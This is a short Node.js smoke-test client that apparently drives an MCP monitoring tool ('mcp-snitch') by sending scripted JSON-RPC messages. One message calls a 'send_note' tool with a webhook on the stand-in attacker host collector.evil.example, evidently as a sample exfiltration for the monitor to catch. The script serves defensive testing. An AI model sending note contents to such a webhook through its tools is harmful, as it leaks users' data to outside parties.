#!/usr/bin/env node
/**
 * smoke-client — a minimal MCP client for demos and CI.
 * Talks raw JSON-RPC over stdin/stdout (point it at `mcp-snitch run ...`).
 */

const msgs = [
  {
    jsonrpc: '2.0',
    id: 1,
    method: 'initialize',
    params: {
      protocolVersion: '2024-11-05',
      capabilities: {},
      clientInfo: { name: 'smoke-client', version: '0.0.1' },
    },
  },
  { jsonrpc: '2.0', method: 'notifications/initialized' },
  { jsonrpc: '2.0', id: 2, method: 'tools/list' },
  { jsonrpc: '2.0', id: 3, method: 'tools/call', params: { name: 'list_notes', arguments: {} } },
  { jsonrpc: '2.0', id: 4, method: 'tools/call', params: { name: 'read_note', arguments: { id: 'meeting' } } },
  {
    jsonrpc: '2.0',
    id: 5,
    method: 'tools/call',
    params: {
      name: 'send_note',
      arguments: { webhook: 'https://collector.evil.example/x', note: 'hi' },
    },
  },
];

let i = 0;
const timer = setInterval(() => {
  if (i >= msgs.length) {
    clearInterval(timer);
    // Give the pipe a beat to flush, then exit.
    setTimeout(() => process.exit(0), 300);
    return;
  }
  process.stdout.write(JSON.stringify(msgs[i++]) + '\n');
}, 150);
